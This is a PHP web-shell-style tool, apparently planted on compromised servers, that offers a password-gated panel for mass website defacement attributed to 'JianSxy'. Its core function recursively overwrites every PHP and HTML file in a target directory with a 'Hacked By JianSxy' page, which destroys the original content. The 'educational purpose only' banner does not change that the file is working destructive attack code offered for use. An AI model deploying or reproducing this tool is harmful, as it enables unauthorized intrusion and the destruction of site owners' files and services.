<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');

$password = '7c4a8d09ca3762af61e59520943dc26494f8941b';

if(isset($_POST['pass'])) {
    if(sha1($_POST['pass']) == $password) {
        $_SESSION['auth'] = true;
    }
}

if(!isset($_SESSION['auth'])) {
    die('<form method="POST"><input type="password" name="pass" placeholder="Password"><input type="submit" value="Login"></form>');
}

$deface_code = '
<!DOCTYPE html>
<html>
<head>
    <title>Hacked By JianSxy</title>
    <style>
        * { margin: 0; padding: 0; }
        body {
            background: #000;
            color: #0f0;
            font-family: "Courier New", monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .container {
            text-align: center;
            z-index: 10;
        }
        h1 {
            font-size: 80px;
            color: #f00;
            text-shadow: 0 0 20px #f00, 0 0 40px #f00, 0 0 60px #f00;
            animation: glitch 1s infinite;
        }
        @keyframes glitch {
            0%, 100% { transform: translate(0); }
            25% { transform: translate(-5px, 5px); }
            50% { transform: translate(5px, -5px); }
            75% { transform: translate(-5px, -5px); }
        }
        .skull {
            font-size: 150px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.2); }
        }
        .msg {
            font-size: 24px;
            color: #0f0;
            margin-top: 30px;
            text-shadow: 0 0 10px #0f0;
        }
        .info {
            margin-top: 20px;
            color: #fff;
            font-size: 16px;
        }
        canvas {
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1;
        }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div class="container">
        <div class="skull">☠️</div>
        <h1>HACKED</h1>
        <div class="msg">Your Website Has Been Hacked By JianSxy</div>
        <div class="info">
            <p>Security = 0%</p>
            <p>Contact: @JianSxy</p>
        </div>
    </div>
    <script>
        const canvas = document.getElementById("matrix");
        const ctx = canvas.getContext("2d");
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*";
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        for (let i = 0; i < columns; i++) drops[i] = 1;
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0f0";
            ctx.font = fontSize + "px monospace";
            for (let i = 0; i < drops.length; i++) {
                const text = letters[Math.floor(Math.random() * letters.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 33);
    </script>
</body>
</html>
';

function mass_deface($dir, $deface_code, &$count) {
    $files = @scandir($dir);
    if(!$files) return;
    
    foreach($files as $file) {
        if($file == '.' || $file == '..') continue;
        
        $path = $dir . '/' . $file;
        
        if(is_dir($path)) {
            mass_deface($path, $deface_code, $count);
        } else {
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            if(in_array($ext, ['php', 'html', 'htm', 'shtml', 'phtml'])) {
                if(@file_put_contents($path, $deface_code)) {
                    $count++;
                    echo "[OK] $path<br>";
                }
            }
        }
    }
}

if(isset($_POST['deface'])) {
    $target = $_POST['target'];
    $count = 0;
    
    echo "<pre>";
    echo "=================================\n";
    echo "  MASS DEFACE BY JIANSXY\n";
    echo "=================================\n\n";
    echo "Target: $target\n";
    echo "Starting...\n\n";
    
    mass_deface($target, $deface_code, $count);
    
    echo "\n=================================\n";
    echo "Total Files Defaced: $count\n";
    echo "=================================\n";
    echo "</pre>";
    exit;
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>Mass Deface - JianSxy</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(0,0,0,0.9);
            border: 2px solid #0f0;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 50px rgba(0,255,0,0.3);
        }
        h1 {
            color: #f00;
            text-align: center;
            font-size: 36px;
            text-shadow: 0 0 10px #f00;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 10px;
            color: #0f0;
            font-weight: bold;
        }
        input[type="text"] {
            width: 100%;
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 15px;
            font-size: 16px;
            font-family: 'Courier New', monospace;
        }
        input[type="submit"] {
            background: #0f0;
            border: none;
            color: #000;
            padding: 15px 40px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        input[type="submit"]:hover {
            background: #f00;
            color: #fff;
        }
        .info {
            background: rgba(255,0,0,0.1);
            border: 1px solid #f00;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        .info ul {
            margin-left: 20px;
            margin-top: 10px;
        }
        .info li {
            color: #fff;
            margin: 5px 0;
        }
        .warning {
            color: #ff0;
            text-align: center;
            margin-top: 20px;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>☠️ MASS DEFACE ☠️</h1>
        
        <div class="info">
            <strong style="color: #f00;">⚠️ WARNING:</strong>
            <ul>
                <li>This will deface ALL PHP/HTML files in target directory</li>
                <li>Backup recommended before use</li>
                <li>Use at your own risk</li>
            </ul>
        </div>

        <form method="POST">
            <div class="form-group">
                <label>Target Directory:</label>
                <input type="text" name="target" value="<?php echo getcwd(); ?>" required>
            </div>
            
            <input type="submit" name="deface" value="START MASS DEFACE">
        </form>

        <div class="warning">
            ⚠️ FOR EDUCATIONAL PURPOSE ONLY ⚠️
        </div>
    </div>
</body>
</html>